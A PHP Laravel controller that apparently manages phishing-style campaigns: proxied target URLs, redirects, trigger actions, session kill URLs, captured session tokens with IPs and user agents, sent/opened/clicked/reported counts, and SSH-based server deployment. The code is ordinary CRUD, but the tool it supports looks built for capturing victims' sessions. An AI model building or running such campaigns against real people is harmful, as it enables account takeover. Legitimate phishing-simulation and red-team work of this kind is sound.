<?php

namespace App\Http\Controllers;

use App\Jobs\DeployCampaign;
use App\Models\Deployment;
use Illuminate\Http\Request;

class CampaignController extends Controller
{
    /**
     * List the authenticated user's campaigns.
     */
    public function index(Request $request)
    {
        $campaigns = $request->user()->campaigns()
            ->latest('start_date')
            ->get()
            ->map(fn ($c) => $this->format($c));

        return response()->json(['data' => $campaigns]);
    }

    /**
     * Create a new campaign (saved as draft).
     */
    public function store(Request $request)
    {
        $data = $request->validate([
            'name'             => 'required|string|max:255',
            'description'      => 'nullable|string',
            'target_url'       => 'required|url',
            'server_id'        => 'nullable|integer|exists:servers,id',
            'server_host'      => 'required|string|max:255',
            'server_domain'    => 'nullable|string|max:255',
            'deploy_repo_url'  => 'nullable|string|max:512',
            'deploy_branch'    => 'nullable|string|max:255',
            'proxy_enabled'    => 'boolean',
            'proxy_on_the_fly' => 'boolean',
            'redirect_type'    => 'required|in:url,html',
            'redirect_target'  => 'nullable|string',
            'trigger_action'   => 'required|string|max:50',
            'kill_session_url' => 'nullable|url',
        ]);

        $campaign = $request->user()->campaigns()->create(
            array_merge($data, ['status' => 'draft'])
        );

        return response()->json(['data' => $this->format($campaign)], 201);
    }

    /**
     * Return one campaign with its session summary.
     */
    public function show(Request $request, int $id)
    {
        $campaign = $request->user()->campaigns()->findOrFail($id);

        $sessions = $campaign->sessions()->latest()->get()->map(fn ($s) => [
            'id'               => $s->id,
            'token'            => $s->token,
            'ip_address'       => $s->ip_address,
            'user_agent'       => $s->user_agent,
            'status'           => $s->status,
            'triggered_action' => $s->triggered_action,
            'triggered_at'     => optional($s->triggered_at)->format('M j, Y H:i'),
            'ended_at'         => optional($s->ended_at)->format('M j, Y H:i'),
            'created_at'       => optional($s->created_at)->format('M j, Y H:i'),
        ]);

        $latest = $campaign->deployments()->latest()->first();

        return response()->json([
            'data' => array_merge($this->format($campaign), [
                'sessions'        => $sessions,
                'sessions_active' => $campaign->sessions()->where('status', 'active')->count(),
                'deployment'      => $latest ? $this->formatDeployment($latest) : null,
            ]),
        ]);
    }

    /**
     * Update the campaign status.
     * Valid transitions: draft→active, active→completed, active→draft (pause).
     */
    public function updateStatus(Request $request, int $id)
    {
        $campaign = $request->user()->campaigns()->findOrFail($id);

        $data = $request->validate([
            'status' => 'required|in:draft,active,scheduled,completed',
        ]);

        $campaign->update($data);

        return response()->json(['data' => $this->format($campaign)]);
    }

    /**
     * Activate + deploy: attach the server, queue the provisioning job, and
     * flip the campaign to active. The heavy work (SSH, install, clone, run
     * containers, publish link) happens in the background DeployCampaign job.
     */
    public function deploy(Request $request, int $id)
    {
        $campaign = $request->user()->campaigns()->findOrFail($id);

        $data = $request->validate([
            'server_id'       => 'nullable|integer',
            'deploy_repo_url' => 'nullable|string|max:512',
            'deploy_branch'   => 'nullable|string|max:255',
        ]);

        // Resolve the server: explicit server_id wins, else the campaign's.
        $serverId = $data['server_id'] ?? $campaign->server_id;
        $server = $serverId
            ? $request->user()->servers()->find($serverId)
            : null;

        if (! $server) {
            return response()->json([
                'message' => 'Select a server for this campaign before activating.',
            ], 422);
        }

        // Persist chosen server + repo settings on the campaign for reuse.
        $campaign->update([
            'server_id'       => $server->id,
            'server_host'     => $server->ip_address,
            'deploy_repo_url' => $data['deploy_repo_url'] ?? $campaign->deploy_repo_url,
            'deploy_branch'   => $data['deploy_branch'] ?? $campaign->deploy_branch,
            'status'          => 'active',
        ]);

        $deployment = Deployment::create([
            'campaign_id'  => $campaign->id,
            'server_id'    => $server->id,
            'status'       => 'pending',
            'current_step' => 'Queued',
            'log'          => "Deployment queued for {$server->ssh_user}@{$server->ip_address}…\n",
        ]);

        DeployCampaign::dispatch($deployment->id);

        return response()->json([
            'data' => array_merge($this->format($campaign->fresh()), [
                'deployment' => $this->formatDeployment($deployment),
            ]),
        ], 202);
    }

    /**
     * Latest deployment for a campaign — polled by the UI for live progress.
     */
    public function deployment(Request $request, int $id)
    {
        $campaign = $request->user()->campaigns()->findOrFail($id);
        $deployment = $campaign->deployments()->latest()->first();

        return response()->json([
            'data' => $deployment ? $this->formatDeployment($deployment) : null,
        ]);
    }

    private function formatDeployment(Deployment $d): array
    {
        return [
            'id'           => $d->id,
            'status'       => $d->status,
            'current_step' => $d->current_step,
            'log'          => $d->log,
            'link'         => $d->link,
            'error'        => $d->error,
            'started_at'   => optional($d->started_at)->toIso8601String(),
            'finished_at'  => optional($d->finished_at)->toIso8601String(),
        ];
    }

    private function format($c): array
    {
        return [
            'id'               => $c->id,
            'name'             => $c->name,
            'description'      => $c->description,
            'template'         => $c->template,
            'status'           => $c->status,
            'target_url'       => $c->target_url,
            'server_id'        => $c->server_id,
            'server_host'      => $c->server_host,
            'server_domain'    => $c->server_domain,
            'deploy_repo_url'  => $c->deploy_repo_url,
            'deploy_branch'    => $c->deploy_branch,
            'proxy_enabled'    => (bool) $c->proxy_enabled,
            'proxy_on_the_fly' => (bool) $c->proxy_on_the_fly,
            'redirect_type'    => $c->redirect_type,
            'redirect_target'  => $c->redirect_target,
            'trigger_action'   => $c->trigger_action,
            'kill_session_url' => $c->kill_session_url,
            'sent'             => $c->sent,
            'opened'           => $c->opened,
            'clicked'          => $c->clicked,
            'reported'         => $c->reported,
            'start_date'       => optional($c->start_date)->format('M j, Y'),
        ];
    }
}
